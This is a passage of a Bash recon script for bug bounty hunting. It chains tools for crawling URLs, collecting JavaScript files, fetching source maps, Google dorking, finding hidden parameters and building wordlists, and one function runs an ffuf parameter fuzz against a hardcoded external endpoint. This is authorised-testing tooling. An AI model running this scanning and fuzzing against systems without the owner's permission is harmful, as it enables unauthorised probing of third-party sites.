	echo -e "${BGREEN}[+] GALER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/galer.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

GOURLEX(){
	START_SPINNER "${BGREEN}GOURLEX${RESET}"

	cat ${SUBDOMAINDIR}/alivesubs.txt | interlace --silent -threads 10 -c "gourlex -t _target_ -uO -s > _output_/_cleantarget_.txt" -o ${GOURLEX} 2>> >(sed "s/^/${FUNCNAME[0]}: /" >> "$ERRORLOGFILE") >/dev/null
	cat ${GOURLEX}/*.txt | unew -el -t -q ${URLSDIR}/gourlex.urls

	# Reuse old scanned data
	# cat ${BASEDIR}/${TARGET}*/.tmp/urls/galer.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/galer.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] GOURLEX${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/gourlex.urls|| echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

PATHFINDER(){
	START_SPINNER "${BGREEN}PATHFINDER${RESET}"

	if [ "$PATHFINDER_SCAN_MODE" = "NORMAL" ]; then
		for target in $(cat alivesubs.txt);do pathfinder -u $target --threads 25 --with-assets;done | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | unew -el -t -q ${URLSDIR}/pathfinder.urls
	fi

	if [ "$PATHFINDER_SCAN_MODE" = "ADVANCED" ]; then
		for target in $(cat alivesubs.txt);do pathfinder -u $target --threads 25 --with-assets;done | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | unew -el -t -q ${URLSDIR}/pathfinder.urls

		timelimitx -t 5m bash pathfinder-advanced.sh testphp.vulnweb.com
	fi

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/pathfinder.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/pathfinder.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] PATHFINDER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/pathfinder.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

PATHCRAWLER(){
	START_SPINNER "${BGREEN}PATHCRAWLER${RESET}"

	cat ${SUBDOMAINDIR}/alivesubs.txt | pathcrawler -silent -complete-url -concurrent $PATHCRAWLER_CONCURRENT -delay $PATHCRAWLER_DELAY -timeout $PATHCRAWLER_TIMEOUT 2>/dev/null | unew -el -t -q ${URLSDIR}/pathcrawler.urls

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/pathcrawler.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/pathcrawler.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] PATHCRAWLER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/pathcrawler.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

ROBOXTRACTOR(){
	START_SPINNER "${BGREEN}ROBOXTRACTOR${RESET}"

	timelimitx -t ${ROBOXTRACTOR_TIMELIMITX} "cat ${SUBDOMAINDIR}/alivesubs.txt | roboxtractor -s -m 0 | unew -el -t -q ${URLSDIR}/roboxtractor.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/roboxtractor.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/roboxtractor.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] ROBOXTRACTOR${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/roboxtractor.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

ROBOTXT(){
	START_SPINNER "${BGREEN}ROBOTXT${RESET}"

	timelimitx -t ${ROBOTXT_TIMELIMITX} "cat ${SUBDOMAINDIR}/alivesubs.txt | robotxt -silent -complete -delay $ROBOTXT_DELAY -timeout $ROBOTXT_TIMEOUT 2>/dev/null | sed 's/^\Disallow: //' | sed 's/^\Allow: //' | unew -el -t -q ${URLSDIR}/robotxt.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/robotxt.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/robotxt.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] ROBOTXT${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/robotxt.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

# Google Dorking
AUTOMATED_GOOGLE_DORKING(){
	START_SPINNER "${BGREEN}AUTOMATED_GOOGLE_DORKING${RESET}"

	# Check if the file exists and has 0 lines
    if [ ! -s "${SUBDOMAINDIR}/withoutprotocolsubs.txt" ]; then
        echo -e "${BRED}[x] AUTOMATED_GOOGLE_DORKING${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

    cat dorks.txt | gorker --silent --wait 0 -o ${URLSDIR}/automated_google_dorking.urls
	cat ${URLSDIR}/automated_google_dorking.urls | unew -el -t -q ${URLSDIR}/automated_google_dorking.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] AUTOMATED_GOOGLE_DORKING${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/automated_google_dorking.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

MANUAL_GOOGLE_DORKING(){
    if [ ! -s "$ROOT_INPUTFILES/manual_google_dorking.txt" ]; then
        echo -e "${GRAY}[!] I collected google dorks output as much as i can using automated tools, You can add your manual google dorks output in ${URLSDIR}/manual_google_dorking.urls currently file is empty. Please choose an option:${RESET}"
        echo -e "${GRAY}1. Wait for up to 30 minutes, I'm not done yet still doing google dorking but allow me to continue if i'm done earlier by pressing Enter button"
        echo -e "${GRAY}2. Done, I have done google dorking don't wait now"
        echo -e "${GRAY}3. Skip, I don't have time for manual google dorking"

        # Read user input with a timeout of 1 minute
        read -t ${MANUAL_GOOGLE_DORKING_OPTION_WAIT} -p "Select an option (1/2/3): " option

        # If no input after 60 seconds, automatically select Option 1
        if [ -z "$option" ]; then
            option=${MANUAL_GOOGLE_DORKING_OPTION_SELECT}
            echo -e "\n${GRAY}[+] No input received from user, automatically choosing Option ${MANUAL_GOOGLE_DORKING_OPTION_SELECT}${RESET}"
        fi
        
        case "$option" in
            1)
                echo -e "${BGREEN}[+] Waiting for up to 30 minutes. Press Enter if you're done early...${RESET}"

                echo -e "MANUAL_GOOGLE_DORKING: Waiting for manually google dorking" | notify -silent -duc -id xssnotify &>/dev/null
                
                # Display prompt once and enter wait loop
                counter=0
                while true; do
                    read -t 60 -n 1 input
                    if [ $? -eq 0 ]; then
                        echo -e "${BGREEN}[+] Done early! Proceeding...${RESET}"

                        break
                    fi
                    # Exit after 30 minutes if Enter is not pressed
                    ((counter++))
                    if [ $counter -eq ${MANUAL_GOOGLE_DORKING_TIME} ]; then
                        echo -e "${BGREEN}[+] 30 minutes have passed. Proceeding...${RESET}"
                        break
                    fi
                done
                ;;
            2)
                echo -e "${BGREEN}[+] Done with Google dorking. Proceeding...${RESET}"
                ;;
            3)
                echo -e "${YELLOW}[!] Skipping manual Google dorking.${RESET}"
                return
                ;;
            *)
                echo -e "${YELLOW}[!] Invalid option. Skipping manual Google dorking.${RESET}"
                return
                ;;
        esac
    fi

    # Display the count of lines in manual_google_dorking.urls
    echo -e "${BGREEN}[+] MANUAL_GOOGLE_DORKING${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/manual_google_dorking.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

# JS Crawling
SUBJS(){
	START_SPINNER "${BGREEN}SUBJS${RESET}"

	timelimitx -t ${SUBJS_TIMELIMITX} "cat ${SUBDOMAINDIR}/alivesubs.txt | subjs | unew -el -i -t -q ${URLSDIR}/subjs.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/subjs.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/subjs.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] SUBJS${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/subjs.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

GETJS(){
	START_SPINNER "${BGREEN}GETJS${RESET}"

	timelimitx -t ${GETJS_TIMELIMITX} "cat ${SUBDOMAINDIR}/alivesubs.txt | getJS --complete | unew -el -i -t -q ${URLSDIR}/getJS.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/getJS.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/getJS.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] GETJS${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/getJS.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

JSCRAWLER(){
	START_SPINNER "${BGREEN}JSCRAWLER${RESET}"

	timelimitx -t ${JSCRAWLER_TIMELIMITX} "cat ${SUBDOMAINDIR}/alivesubs.txt | jscrawler --silent --complete --timeout 15 --threads 50 | egrep -av '\(' | sed 's/\\$//' | unew -el -i -t -q ${URLSDIR}/jscrawler.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/${URLSDIR}/jscrawler.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/jscrawler.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] JSCRAWLER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/jscrawler.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

JSFINDER(){
	START_SPINNER "${BGREEN}JSFINDER${RESET}"

	cat ${SUBDOMAINDIR}/alivesubs.txt | jsfinder -s -read -c 20 -o ${URLSDIR}/jsfinder.urls &>/dev/null

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/jsfinder.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/jsfinder.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] JSFINDER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/jsfinder.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

JAVASCRIPT_DEOBFUSCATOR(){
	START_SPINNER "${BGREEN}JAVASCRIPT_DEOBFUSCATOR${RESET}"

	# https://github.com/ben-sb/javascript-deobfuscator

	STOP_SPINNER
	echo -e "${BGREEN}[+] JAVASCRIPT_DEOBFUSCATOR${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/javascript_deobfuscator.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

LINKFINDER(){
	START_SPINNER "${BGREEN}LINKFINDER${RESET}"

	STOP_SPINNER
	echo -e "${BGREEN}[+] LINKFINDER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/linkfinder.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

XNLINKFINDER(){
	START_SPINNER "${BGREEN}XNLINKFINDER${RESET}"

	timelimitx -t ${XNLINKFINDER_TIMELIMITX} "cat ${SUBDOMAINDIR}/alivesubs.txt | xnLinkFinder --no-banner --scope-prefix ${SUBDOMAINDIR}/alivesubs.txt --scope-filter ${TARGET} --depth 3 --timeout 10 --max-time-limit 60 -o ${URLSDIR}/xnLinkFinder.urls -op ${URLSDIR}/xnLinkFinder.params" &>/dev/null

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/xnLinkFinder.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/xnLinkFinder.urls
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/xnLinkFinder.params 2>/dev/null | unew -el -t -q ${URLSDIR}/xnLinkFinder.params

	STOP_SPINNER
	echo -e "${BGREEN}[+] XNLINKFINDER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/xnLinkFinder.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

GETJSWORDS(){
	START_SPINNER "${BGREEN}GETJSWORDS${RESET}"

	STOP_SPINNER
	echo -e "${BGREEN}[+] GETJSWORDS${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/getjswords.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

SOURCEMAPPER(){
	START_SPINNER "${BGREEN}SOURCEMAPPER${RESET}"

	cat ${URLSDIR}/*.urls | grep -a "\.js$" | sed 's/\.js$/.js.map/' | unew -el -t -q ${URLSDIR}/jsmaplinks.txt
	cat ${URLSDIR}/*.urls | grep -a "\.js.map$" | unew -el -t -q ${URLSDIR}/jsmaplinks.txt

	# Check if the file exists and has 0 lines
    if [ ! -s "$URLSDIR/jsmaplinks.txt" ]; then
        echo -e "${BRED}[x] SOURCEMAPPER${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

    # Run the commands if the file has content
	cat ${URLSDIR}/jsmaplinks.txt | interlace --silent -threads 10 -c "sourcemapper -insecure -url _target_ -output _output_/_cleantarget_" -o ${SOURCEMAPPERDIR} 2>> >(sed "s/^/${FUNCNAME[0]}: /" >> "$ERRORLOGFILE") >/dev/null
	# cat ${SOURCEMAPPERDIR}/*.urls | unew -el -t -q ${URLSDIR}/sourcemapper.urls

	# Reuse old scanned data
	# cat ${BASEDIR}/${TARGET}*/.tmp/urls/sourcemapper.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/sourcemapper.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] SOURCEMAPPER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/sourcemapper.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

LINX(){
	START_SPINNER "${BGREEN}LINX${RESET}"

	cat ${URLSDIR}/*.urls | grep -a "\.js$" | unew -el -i -t -q ${URLSDIR}/linx_jslinks.txt
	i=1; while IFS= read -r target; do linx -target "$target" -output "linx_${i}.html"; ((i++)); done < ${URLSDIR}/linx_jslinks.txt

	# Write golang code that will fetch path in .html along with input/title
	# cat index.html | go run linx-filter.go
	# cat *.html | go run linx-filter.go

	# Reuse old scanned data
	# cat ${BASEDIR}/${TARGET}*/.tmp/urls/naabu.txt 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/bugbountydata.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] LINX${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/linx.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

JSLUICE(){
	START_SPINNER "${BGREEN}LINX${RESET}"

	cat ${URLSDIR}/*.urls | grep -a "\.js$" | unew -el -i -t -q ${URLSDIR}/jsluice_jslinks.txt
	cat ${URLSDIR}/jsluice_jslinks.txt | jsluice urls --no-check-certificate --concurrency 5 | unew -a -q ${URLSDIR}/jsluice_urls.txt

	# cat ${URLSDIR}/jsluice_urls.txt | filteroutput | unew -el -i -t -q ${URLSDIR}/jsluice.urls

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/jsluice.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/jsluice.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] LINX${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/jsluice.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Hidden Parameter
PARAMFINDER(){
	START_SPINNER "${BGREEN}PARAMFINDER${RESET}"

	if [ "$PARAMFINDER_SCAN_MODE" = "NORMAL" ]; then
		cat ${URLSDIR}/*.urls | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | grep -aE '\.(php|jsp|jspa|asp|aspx|html)$' | egrep -av "=" | unew -el -t -q ${URLSDIR}/paramfinderlinks.txt
	fi

	if [ "$PARAMFINDER_SCAN_MODE" = "ADVANCED" ]; then
		cat ${ROOT_SUBDOMAINDIR}/allsubs.txt | unew -el -t -q ${URLSDIR}/paramfinderlinks.txt
		cat ${ROOT_URLSDIR}/allurls.txt | cut -d"/" -f1-4 | unew -el -t -q ${URLSDIR}/paramfinderlinks.txt
		cat ${ROOT_URLSDIR}/allurls.txt | cut -d"/" -f1-5 | unew -el -t -q ${URLSDIR}/paramfinderlinks.txt
		cat ${ROOT_URLSDIR}/allurls.txt | cut -d"/" -f1-6 | unew -el -t -q ${URLSDIR}/paramfinderlinks.txt
		cat ${URLSDIR}/*.urls | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | grep -aE '\.(php|jsp|jspa|asp|aspx|html)$' | egrep -av "=" | unew -el -t -q ${URLSDIR}/paramfinderlinks.txt
	fi

	# Common steps for both TRUE and FALSE conditions
	cat ${URLSDIR}/paramfinderlinks.txt | paramfinder --silent --insecure -c ${PARAMFINDER_THREADS} --timeout ${PARAMFINDER_TIMEOUT} | grep 'TRANSFORM_URL:' | sed 's/^TRANSFORM_URL: //' | unew -el -i -t -q ${URLSDIR}/paramfinder.urls

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/paramfinder.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/paramfinder.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] PARAMFINDER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/paramfinder.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

MSARJUN(){
	START_SPINNER "${BGREEN}MSARJUN${RESET}"

	cat ${URLSDIR}/*.urls | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | grep -aE '\.(php|jsp|jspa|asp|aspx)$' | egrep -av "=" | unew -el -t -q ${URLSDIR}/paramfinderlinks.txt
	timelimitx -t ${MSARJUN_TIMELIMITX} "cat ${URLSDIR}/paramfinderlinks.txt | msarjun -silent -arjunCmd \"arjun -u {urlStr} -m GET,POST,XML,JSON\" -concurrency 1 -json -ao ${URLSDIR}/msarjun.json" &>/dev/null
	cat ${URLSDIR}/msarjun.json | jq -r '.transformed_url' | unew -el -t -q ${URLSDIR}/msarjun.urls

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/msarjun.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/msarjun.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] MSARJUN${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/msarjun.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

X8(){
	START_SPINNER "${BGREEN}X8${RESET}"

	cat ${URLSDIR}/*.urls | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | grep -aE '\.(php|jsp|jspa|asp|aspx)$' | egrep -av "=" | unew -el -t -q ${URLSDIR}/paramfinderlinks.txt

	# Check if the file exists and has 0 lines
    if [ ! -s "$URLSDIR/paramfinderlinks.txt" ]; then
        echo -e "${BRED}[x] X8${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

	timelimitx -t ${X8_TIMELIMITX} "cat ${URLSDIR}/paramfinderlinks.txt | interlace --silent -threads 1 -c \"x8 -u _target_ -X GET POST XML JSON --disable-progress-bar --output-format json --append --output _output_/x8.json\" -o ${URLSDIR} 2>/dev/null"

	cat ${URLSDIR}/x8.json | jq -r '.[] | select(.found_params | length > 0) | "Transformed URL [\(.method)]: \(.url)?\( ([.found_params[] | "\(.name)=rix4uni"] | join("&")) )"' | unew -el -t -q ${URLSDIR}/x8.urls

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/x8.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/x8.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] X8${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/x8.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

ALLURLS(){
	START_SPINNER "${BGREEN}ALLURLS${RESET}"

	cat ${URLSDIR}/*.urls | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | unew -el -t -q ${ROOT_URLSDIR}/allurls.txt

	cat ${ROOT_URLSDIR}/allurls.txt | urldedupe -s | eval ${URLS_FILTER} | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | unew -el -t -q ${URLSDIR}/filteredurls.txt

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/urls/allurls.txt 2>/dev/null | eval ${URLS_FILTER} | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | unew -el -i -t -q ${ROOT_URLSDIR}/allurls.txt
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/filteredurls.txt 2>/dev/null | eval ${URLS_FILTER} | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | unew -el -i -t -q ${URLSDIR}/filteredurls.txt

	STOP_SPINNER
	echo -e "${BGREEN}[+] ALLURLS${RESET}: $(wc -l 2>/dev/null < ${ROOT_URLSDIR}/allurls.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
	echo -e "${BGREEN}[+] FILTEREDALLURLS${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/filteredurls.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

SUBDOMAIN_SCRAPING(){
	START_SPINNER "${BGREEN}SUBDOMAIN_SCRAPING${RESET}"

	cat ${ROOT_URLSDIR}/allurls.txt | sed -e 's/https\?:\/\/\(www\.\)\?//' | cut -d"/" -f1 | unew -ef -el -i -t ${ROOT_SUBDOMAINDIR}/allsubs.txt | unew -ef -el -i -t ${SUBDOMAINDIR}/subdomain_scraping.subs

	# Reuse old scanned data
	# cat ${BASEDIR}/${TARGET}*/urls/allurls.txt 2>/dev/null | eval ${URLS_FILTER} | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | unew -el -i -t -q ${ROOT_URLSDIR}/allurls.txt

	STOP_SPINNER
	echo -e "${BGREEN}[+] SUBDOMAIN_SCRAPING${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/subdomain_scraping.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

JS_SUBDOMAINS(){
	START_SPINNER "${BGREEN}JS_SUBDOMAINS${RESET}"

	cat ${ROOT_URLSDIR}/allurls.txt | grep -a "\.js$" | unew -ef -el -q ${URLSDIR}/js_subdomains_jslinks.txt
	for target in $(cat ${URLSDIR}/js_subdomains_jslinks.txt);do echo $target;done

	for target in $(cat "${URLSDIR}/js_subdomains_jslinks.txt"); do
	  curl -s "$target" | grep -oP '(\*-[a-zA-Z0-9]+(\.[a-zA-Z0-9]+)*\.[a-zA-Z]{2,}|\*\.?[a-zA-Z0-9]+([.-][a-zA-Z0-9]+)*\.[a-zA-Z]{2,}|[a-zA-Z0-9]+([.-][a-zA-Z0-9]+)*\.[a-zA-Z]{2,}|[a-zA-Z0-9]+(\.\*)?\.[a-zA-Z0-9]+(\.[a-zA-Z]{2,}))' | eval ${URLS_FILTER} | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | unew -ef -el -q ${URLSDIR}/js_subdomains.txt
	done

	cat allurls.txt | interlace --silent -threads 10 -c "curl -s _target_ | grep -oP '(\*-[a-zA-Z0-9]+(\.[a-zA-Z0-9]+)*\.[a-zA-Z]{2,}|\*\.?[a-zA-Z0-9]+([.-][a-zA-Z0-9]+)*\.[a-zA-Z]{2,}|[a-zA-Z0-9]+([.-][a-zA-Z0-9]+)*\.[a-zA-Z]{2,}|[a-zA-Z0-9]+(\.\*)?\.[a-zA-Z0-9]+(\.[a-zA-Z]{2,}))' >> _output_/_cleantarget_.txt" -o ${PDFTOTEXTDIR}

	# Reuse old scanned data
	# cat ${BASEDIR}/${TARGET}*/urls/js_subdomains.txt 2>/dev/null | eval ${URLS_FILTER} | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | unew -el -i -t -q ${ROOT_URLSDIR}/js_subdomains.txt

	STOP_SPINNER
	echo -e "${BGREEN}[+] JS_SUBDOMAINS${RESET}: $(wc -l 2>/dev/null < ${ROOT_URLSDIR}/js_subdomains.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

MANUAL_ALLURLS_FILTER(){
    echo -e "${GRAY}[!] Remove unnecessary urls manually in $URLSDIR/filteredurls.txt. Please choose an option:${RESET}"
    echo -e "${GRAY}1. Wait for up to 30 minutes, I'm not done yet still removing unnecessary urls manually but allow me to continue if i'm done earlier by pressing Enter button"
    echo -e "${GRAY}2. Done, I have removed unnecessary urls manually don't wait now"
    echo -e "${GRAY}3. Skip, I don't have time for removing unnecessary urls manually"

    # Read user input with a timeout of 1 minute
    read -t ${MANUAL_ALLURLS_FILTER_OPTION_WAIT} -p "Select an option (1/2/3): " option

    # If no input after 60 seconds, automatically select Option 1
    if [ -z "$option" ]; then
        option=${MANUAL_ALLURLS_FILTER_OPTION_SELECT}
        echo -e "\n${GRAY}[+] No input received from user, automatically choosing Option ${MANUAL_ALLURLS_FILTER_OPTION_SELECT}${RESET}"
    fi
        
    case "$option" in
        1)
            echo -e "${BGREEN}[+] Waiting for up to 30 minutes. Press Enter if you're done early...${RESET}"

            echo -e "MANUAL_ALLURLS_FILTER: Remove unnecessary urls manually" | notify -silent -duc -id xssnotify &>/dev/null

            # Display prompt once and enter wait loop
            counter=0
            while true; do
                read -t 60 -n 1 input
                if [ $? -eq 0 ]; then
                    echo -e "${BGREEN}[+] Done early! Proceeding...${RESET}"
                    break
                fi
                # Exit after 30 minutes if Enter is not pressed
                ((counter++))
                if [ $counter -eq ${MANUAL_ALLURLS_FILTER_TIME} ]; then
                    echo -e "${BGREEN}[+] 30 minutes have passed. Proceeding...${RESET}"
                    break
                fi
            done
            ;;
        2)
            echo -e "${BGREEN}[+] Done with removing unnecessary urls manually. Proceeding...${RESET}"
            ;;
        3)
            echo -e "${YELLOW}[!] Skipping removing unnecessary urls manually.${RESET}"
            return
            ;;
        *)
            echo -e "${YELLOW}[!] Invalid option. Skipping removing unnecessary urls manually.${RESET}"
            return
            ;;
    esac

    # Display the count of lines in filteredurls.txt
    echo -e "${BGREEN}[+] MANUAL_ALLURLS_FILTER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/filteredurls.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Program Based Wordlist Generator
CEWL(){
	START_SPINNER "${BGREEN}CEWL${RESET}"

	cat ${SUBDOMAINDIR}/alivesubs.txt | interlace --silent -threads 10 -c "cewl _target_ -d 2 -m 3 | sed '1d' > _output_/_cleantarget_.txt" -o ${CEWL}
	cat ${CEWL}/*.txt | unew -el -t -q ${ROOT_WORDLISTDIR}/cewl.params

	STOP_SPINNER
	echo -e "${BGREEN}[+] CEWL${RESET}: $(wc -l 2>/dev/null < ${ROOT_WORDLISTDIR}/cewl.params || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

UNFURL(){
	START_SPINNER "${BGREEN}UNFURL${RESET}"

	STOP_SPINNER
	echo -e "${BGREEN}[+] UNFURL${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/unfurl.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

CUSTOM_PARAM(){
	START_SPINNER "${BGREEN}CUSTOM_PARAM${RESET}"

	cat ${ROOT_URLSDIR}/allurls.txt | grep -aE '\.(php|jsp|jspa|asp|aspx)' | sed 's/\(\.\(php\|jsp\|jspa\|asp\|aspx\)\).*$/\1/' | rev | cut -d"/" -f1 | rev | cut -d"." -f1 | sed 's/[A-Z]\+/\n&/g' | unew -el -t -q ${ROOT_WORDLISTDIR}/custom_param.txt
	cat ${ROOT_URLSDIR}/allurls.txt | grep -aE '\.(php|jsp|jspa|asp|aspx)' | sed 's/\(\.\(php\|jsp\|jspa\|asp\|aspx\)\).*$/\1/' | rev | cut -d"/" -f1 | rev | cut -d"." -f1 | sed 's/[A-Z]\+/\n&/g' | unew -el -i -t -q ${ROOT_WORDLISTDIR}/custom_param.txt

	STOP_SPINNER
	echo -e "${BGREEN}[+] CUSTOM_PARAM${RESET}: $(wc -l 2>/dev/null < ${ROOT_WORDLISTDIR}/custom_param.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

COOK(){
	START_SPINNER "${BGREEN}COOK${RESET}"

	STOP_SPINNER
	echo -e "${BGREEN}[+] COOK${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/cook.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Password Dictionary Generation
PYDICTOR(){
	START_SPINNER "${BGREEN}PYDICTOR${RESET}"

	STOP_SPINNER
	echo -e "${BGREEN}[+] PYDICTOR${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/pydictor.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


FFUF_CUSTOM_PARAM(){
	START_SPINNER "${BGREEN}FFUF_CUSTOM_PARAM${RESET}"

	# https://freedium.cfd/https://0xmahmoudjo0.medium.com/how-i-found-multiple-sql-injection-with-ffuf-and-sqlmap-in-a-few-minutes-9c3bb3780e8f
	ffuf -w ${ROOT_WORDLISTDIR}/custom_param.txt -X POST -d "FUZZ=rix4uni" -u "https://redacted.org/searchProgressCommitment.php"

	STOP_SPINNER
	echo -e "${BGREEN}[+] FFUF_CUSTOM_PARAM${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/ffuf_custom_param.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Subdomain Takeover
SUBZY(){
	START_SPINNER "${BGREEN}SUBZY${RESET}"

